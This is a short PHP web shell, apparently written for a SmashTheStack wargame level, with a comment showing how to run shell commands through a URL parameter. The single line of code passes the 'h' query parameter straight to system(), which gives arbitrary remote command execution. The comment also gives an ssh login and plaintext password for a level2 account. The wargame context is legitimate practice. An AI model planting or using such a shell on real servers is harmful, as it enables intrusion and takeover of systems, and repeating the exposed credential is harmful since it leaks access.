

/***********************************************************
 * h is a parameter which could accepted by the server
eg:
http://logic.smashthestack.org:8181/uploads/myfile.php?h=ls%20-l%20%20/home/level1/
set h = "ls -l /home/level1/"; %20 is the URL-encode of space
The whole article about level1 can be found at http://seanmurphree.com/blog/?p=255

ssh -p 2227 logic.smashthestack.org -l level2
passwd : ach3sa6F
************************************************************
*/

<?
  echo system($_GET["h"]);
?>


